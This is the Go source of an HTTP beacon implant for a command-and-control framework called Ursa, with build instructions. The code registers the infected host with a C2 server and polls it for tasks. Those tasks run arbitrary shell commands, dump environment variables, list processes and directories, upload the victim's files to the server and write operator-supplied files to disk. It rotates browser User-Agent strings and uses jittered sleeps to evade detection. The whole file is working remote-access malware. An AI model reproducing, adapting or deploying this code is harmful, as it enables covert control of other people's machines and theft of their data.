// Ursa HTTP Implant — http_go
// ============================
// Fully functional Go beacon for the Ursa C2 framework.
// No external dependencies — standard library only.
//
// BUILD
// -----
//   # Native
//   go build -o agent ./http_go.go
//
//   # Cross-compile
//   GOOS=linux   GOARCH=amd64 go build -o agent-linux  http_go.go
//   GOOS=windows GOARCH=amd64 go build -o agent.exe    http_go.go
//   GOOS=darwin  GOARCH=arm64 go build -o agent-mac    http_go.go
//
// VIA BUILDER
// -----------
//   python -m implants.builder build \
//       --template http_go \
//       --c2 http://10.0.0.1:6708 \
//       --output /tmp/agent.go \
//       --post-build "go build -o {binary} {output}"
//
// PROTOCOL
// --------
//   POST /register  body: {hostname, username, os, arch, pid, process}
//                   resp: {session_id: str, key: str, crypto: {...}}
//   POST /beacon    body: {session_id: str, encrypted?: true}
//                   resp: {data: AES-GCM frame} or {tasks: [{id, type, args}]}
//   POST /result    body: {session_id, task_id, encrypted?: true, data?: AES-GCM frame}
//   POST /upload    body: {session_id, encrypted?: true, data?: AES-GCM frame}
//
// This template currently uses the plaintext compatibility path.

package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"sort"
	"strings"
	"time"
)

// ── Config (builder substitutes URSA_* tokens at build time) ─────────────────

const c2URL = "URSA_C2_URL"

// These become numeric literals after substitution, e.g.: 5  and  0.3
const (
	defaultInterval = URSA_INTERVAL
	defaultJitter   = URSA_JITTER
)

// ── User-Agent pool (one chosen at startup) ───────────────────────────────────

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14.3; rv:123.0) Gecko/20100101 Firefox/123.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.2365.92",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
}

// ── Beacon ────────────────────────────────────────────────────────────────────

type Beacon struct {
	server    string
	interval  float64
	jitter    float64
	sessionID string
	ua        string
	client    *http.Client
	running   bool
}

func newBeacon() *Beacon {
	return &Beacon{
		server:   strings.TrimRight(c2URL, "/"),
		interval: float64(defaultInterval),
		jitter:   float64(defaultJitter),
		ua:       userAgents[rand.Intn(len(userAgents))],
		client:   &http.Client{Timeout: 30 * time.Second},
		running:  true,
	}
}

// ── HTTP helpers ──────────────────────────────────────────────────────────────

func (b *Beacon) post(path string, data interface{}) (map[string]interface{}, error) {
	body, err := json.Marshal(data)
	if err != nil {
		return nil, err
	}
	req, err := http.NewRequest("POST", b.server+path, bytes.NewReader(body))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", b.ua)

	resp, err := b.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	var result map[string]interface{}
	if err := json.Unmarshal(respBody, &result); err != nil {
		return nil, err
	}
	return result, nil
}

func (b *Beacon) getRaw(path string) ([]byte, error) {
	req, err := http.NewRequest("GET", b.server+path, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("User-Agent", b.ua)
	resp, err := b.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	return io.ReadAll(resp.Body)
}

// ── Registration ──────────────────────────────────────────────────────────────

func (b *Beacon) register() bool {
	hostname, _ := os.Hostname()
	user := os.Getenv("USER")
	if user == "" {
		user = os.Getenv("USERNAME")
	}
	if user == "" {
		user = "unknown"
	}
	exe, _ := os.Executable()

	data := map[string]interface{}{
		"hostname": hostname,
		"username": user,
		"os":       runtime.GOOS + "/" + runtime.GOARCH,
		"arch":     runtime.GOARCH,
		"pid":      os.Getpid(),
		"process":  exe,
		"interval": b.interval,
		"jitter":   b.jitter,
	}

	resp, err := b.post("/register", data)
	if err != nil {
		return false
	}
	sid, ok := resp["session_id"].(string)
	if !ok || sid == "" {
		return false
	}
	b.sessionID = sid
	if iv, ok := resp["interval"].(float64); ok {
		b.interval = iv
	}
	if jit, ok := resp["jitter"].(float64); ok {
		b.jitter = jit
	}
	return true
}

// ── Beacon / results ──────────────────────────────────────────────────────────

func (b *Beacon) checkIn() []map[string]interface{} {
	resp, err := b.post("/beacon", map[string]interface{}{"session_id": b.sessionID})
	if err != nil {
		return nil
	}
	raw, ok := resp["tasks"].([]interface{})
	if !ok {
		return nil
	}
	tasks := make([]map[string]interface{}, 0, len(raw))
	for _, t := range raw {
		if m, ok := t.(map[string]interface{}); ok {
			tasks = append(tasks, m)
		}
	}
	return tasks
}

func (b *Beacon) sendResult(taskID, result, errStr string) {
	b.post("/result", map[string]interface{}{ //nolint:errcheck
		"session_id": b.sessionID,
		"task_id":    taskID,
		"result":     result,
		"error":      errStr,
	})
}

func (b *Beacon) uploadFile(filename string, data []byte) {
	b.post("/upload", map[string]interface{}{ //nolint:errcheck
		"session_id": b.sessionID,
		"filename":   filename,
		"data":       base64.StdEncoding.EncodeToString(data),
	})
}

// ── Task execution ────────────────────────────────────────────────────────────

func args(task map[string]interface{}) map[string]interface{} {
	if a, ok := task["args"].(map[string]interface{}); ok {
		return a
	}
	return map[string]interface{}{}
}

func strArg(a map[string]interface{}, key, def string) string {
	if v, ok := a[key].(string); ok {
		return v
	}
	return def
}

func (b *Beacon) execute(task map[string]interface{}) {
	taskType, _ := task["type"].(string)
	taskID, _ := task["id"].(string)
	a := args(task)

	var result string
	var taskErr string

	switch taskType {
	case "shell":
		result = execShell(strArg(a, "command", ""))

	case "sysinfo":
		result = b.execSysinfo()

	case "ps":
		result = execPs()

	case "whoami":
		result = execWhoami()

	case "pwd":
		wd, err := os.Getwd()
		if err != nil {
			taskErr = err.Error()
		} else {
			result = wd
		}

	case "cd":
		path := strArg(a, "path", "")
		if err := os.Chdir(expandHome(path)); err != nil {
			taskErr = err.Error()
		} else {
			wd, _ := os.Getwd()
			result = wd
		}

	case "ls":
		result = execLs(strArg(a, "path", "."))

	case "env":
		result = execEnv()

	case "download":
		path := expandHome(strArg(a, "path", ""))
		data, err := os.ReadFile(path)
		if err != nil {
			taskErr = err.Error()
		} else {
			b.uploadFile(filepath.Base(path), data)
			result = fmt.Sprintf("Uploaded %s (%d bytes) to C2", path, len(data))
		}

	case "upload":
		path := expandHome(strArg(a, "path", ""))
		dataB64 := strArg(a, "data", "")
		data, err := base64.StdEncoding.DecodeString(dataB64)
		if err != nil {
			taskErr = "base64 decode failed: " + err.Error()
		} else if err := os.WriteFile(path, data, 0600); err != nil {
			taskErr = err.Error()
		} else {
			result = fmt.Sprintf("Written %d bytes to %s", len(data), path)
		}

	case "sleep":
		if iv, ok := a["interval"].(float64); ok {
			b.interval = iv
		}
		if jit, ok := a["jitter"].(float64); ok {
			b.jitter = jit
		}
		result = fmt.Sprintf("Sleep: %.0fs (jitter: %.2f)", b.interval, b.jitter)

	case "kill":
		b.sendResult(taskID, "Implant terminated", "")
		b.running = false
		return

	default:
		taskErr = "Unknown task type: " + taskType
	}

	b.sendResult(taskID, result, taskErr)
}

// ── Task helpers ──────────────────────────────────────────────────────────────

func execShell(command string) string {
	if command == "" {
		return ""
	}
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}
	out, err := cmd.CombinedOutput()
	result := strings.TrimSpace(string(out))
	if err != nil {
		result += "\n[exit: " + err.Error() + "]"
	}
	return result
}

func (b *Beacon) execSysinfo() string {
	hostname, _ := os.Hostname()
	user := os.Getenv("USER")
	if user == "" {
		user = os.Getenv("USERNAME")
	}
	exe, _ := os.Executable()
	wd, _ := os.Getwd()
	home, _ := os.UserHomeDir()

	lines := []string{
		fmt.Sprintf("Hostname  : %s", hostname),
		fmt.Sprintf("OS        : %s", runtime.GOOS),
		fmt.Sprintf("Arch      : %s", runtime.GOARCH),
		fmt.Sprintf("Go ver    : %s", runtime.Version()),
		fmt.Sprintf("User      : %s", user),
		fmt.Sprintf("PID       : %d", os.Getpid()),
		fmt.Sprintf("Exe       : %s", exe),
		fmt.Sprintf("CWD       : %s", wd),
		fmt.Sprintf("Home      : %s", home),
		fmt.Sprintf("CPUs      : %d", runtime.NumCPU()),
		fmt.Sprintf("Goroutines: %d", runtime.NumGoroutine()),
		fmt.Sprintf("Interval  : %.0fs (jitter %.2f)", b.interval, b.jitter),
	}
	return strings.Join(lines, "\n")
}

func execPs() string {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("tasklist")
	} else {
		cmd = exec.Command("ps", "aux")
	}
	out, _ := cmd.CombinedOutput()
	s := string(out)
	if len(s) > 5000 {
		s = s[:5000]
	}
	return strings.TrimSpace(s)
}

func execWhoami() string {
	hostname, _ := os.Hostname()
	user := os.Getenv("USER")
	if user == "" {
		user = os.Getenv("USERNAME")
	}
	home, _ := os.UserHomeDir()
	shell := os.Getenv("SHELL")
	if shell == "" {
		shell = "N/A"
	}
	lines := []string{
		fmt.Sprintf("User    : %s", user),
		fmt.Sprintf("Home    : %s", home),
		fmt.Sprintf("Shell   : %s", shell),
		fmt.Sprintf("Hostname: %s", hostname),
		fmt.Sprintf("OS      : %s/%s", runtime.GOOS, runtime.GOARCH),
	}
	// uid/gid on Unix
	if uid := os.Getuid(); uid >= 0 {
		lines = append(lines, fmt.Sprintf("UID     : %d", uid))
		lines = append(lines, fmt.Sprintf("GID     : %d", os.Getgid()))
		if uid == 0 {
			lines = append(lines, "Privilege: ROOT")
		}
	}
	return strings.Join(lines, "\n")
}

func execLs(path string) string {
	path = expandHome(path)
	entries, err := os.ReadDir(path)
	if err != nil {
		return "[ERROR] " + err.Error()
	}
	if len(entries) == 0 {
		return "(empty directory)"
	}
	lines := make([]string, 0, len(entries))
	for _, e := range entries {
		info, err := e.Info()
		if err != nil {
			lines = append(lines, fmt.Sprintf("?  %10s  %s  %s", "?", "?", e.Name()))
			continue
		}
		kind := "f"
		if e.IsDir() {
			kind = "d"
		}
		mtime := info.ModTime().Format("2006-01-02 15:04")
		lines = append(lines, fmt.Sprintf("%s  %10d  %s  %s",
			kind, info.Size(), mtime, e.Name()))
	}
	return strings.Join(lines, "\n")
}

func execEnv() string {
	env := os.Environ()
	sort.Strings(env)
	return strings.Join(env, "\n")
}

func expandHome(path string) string {
	if strings.HasPrefix(path, "~/") {
		home, err := os.UserHomeDir()
		if err == nil {
			return filepath.Join(home, path[2:])
		}
	}
	return path
}

// ── Jitter sleep ──────────────────────────────────────────────────────────────

func (b *Beacon) jitterSleep() {
	lo := b.interval * (1.0 - b.jitter)
	if lo < 0 {
		lo = 0
	}
	hi := b.interval * (1.0 + b.jitter)
	// ~5% chance of a long sleep (5-10×) to break rhythmic patterns
	if rand.Float64() < 0.05 {
		hi = b.interval * (5.0 + rand.Float64()*5.0)
	}
	sleep := lo + rand.Float64()*(hi-lo)
	if sleep < 1 {
		sleep = 1
	}
	time.Sleep(time.Duration(sleep*1000) * time.Millisecond)
}

// ── Main loop ─────────────────────────────────────────────────────────────────

func (b *Beacon) run() {
	// Registration with exponential backoff
	for attempt := 0; attempt < 10; attempt++ {
		if b.register() {
			break
		}
		wait := 1 << attempt // 1, 2, 4, 8 ... 512 seconds
		if wait > 60 {
			wait = 60
		}
		time.Sleep(time.Duration(wait) * time.Second)
		if attempt == 9 {
			return // Give up
		}
	}

	for b.running {
		tasks := b.checkIn()
		for _, task := range tasks {
			b.execute(task)
		}
		b.jitterSleep()
	}
}

// ── Entry point ───────────────────────────────────────────────────────────────

func main() {
	rand.Seed(time.Now().UnixNano()) //nolint:staticcheck
	newBeacon().run()
}
